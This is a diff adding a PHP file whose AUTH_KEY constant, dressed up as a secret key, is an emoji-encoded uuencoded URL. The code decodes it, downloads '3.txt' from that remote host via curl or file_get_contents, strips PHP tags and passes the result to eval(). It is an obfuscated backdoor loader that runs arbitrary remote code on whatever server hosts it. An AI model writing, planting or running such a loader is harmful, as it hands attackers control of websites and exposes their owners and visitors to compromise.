@@ -1,0 +1,45 @@
+<?php
+define('AUTH_KEY', '😇🙃😁🤣😜😌😁😅🤨😆😛🤓😝😍😄😊😋😉🙂🤓😙🙃😁😊🥰😆😘😂😚😉🧐😴😀😴');
+$emoji_to_uu = [
+  '😇'=>'7','🙃'=>':','😁'=>"'",'🤣'=>'1','😜'=>'T','😌'=>'<','😅'=>',','🤨'=>'Z','😆'=>'+',
+  '😛'=>'R','🤓'=>']','😝'=>'S','😍'=>'=','😄'=>'&','😊'=>'5','😋'=>'P','😉'=>';','🙂'=>'6',
+  '😙'=>'M','🥰'=>'B','😘'=>'F','😂'=>'-','😚'=>'O','🧐'=>'2','😴'=>'`','😀'=>"\n",
+];
+
+$uu_line = strtr(AUTH_KEY, $emoji_to_uu);
+$base = trim(convert_uudecode($uu_line));          
+if ($base === '') die('UUdecode kosong');
+
+if (substr($base, -1) !== '/') $base .= '/';
+$url = $base . '3.txt';                             
+
+$code = false;
+if (function_exists('curl_init')) {
+  $ch = curl_init($url);
+  curl_setopt_array($ch, [
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_TIMEOUT        => 8,
+    CURLOPT_USERAGENT      => 'Mozilla/5.0',
+    CURLOPT_IPRESOLVE      => 1,   // CURL_IPRESOLVE_V4
+    CURLOPT_SSL_VERIFYPEER => true,
+    CURLOPT_SSL_VERIFYHOST => 2,
+  ]);
+  $code = curl_exec($ch);
+  $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+  curl_close($ch);
+  if ($code === false || $http !== 200) $code = false;
+}
+if ($code === false) {
+  $ctx = stream_context_create([
+    'http' => ['timeout'=>8, 'header'=>"User-Agent: Mozilla/5.0\r\n"],
+  ]);
+  $code = @file_get_contents($url, false, $ctx);
+}
+if ($code === false) die('gagal ambil 3.txt: ' . htmlspecialchars($url));
+
+$code = preg_replace('/^\xEF\xBB\xBF/', '', $code);          
+$code = str_replace(["\r\n","\r"], "\n", $code);
+$code = preg_replace('/^\s*<\?(php)?/i', '', $code);
+$code = preg_replace('/\?>\s*$/', '', $code);
+eval($code);
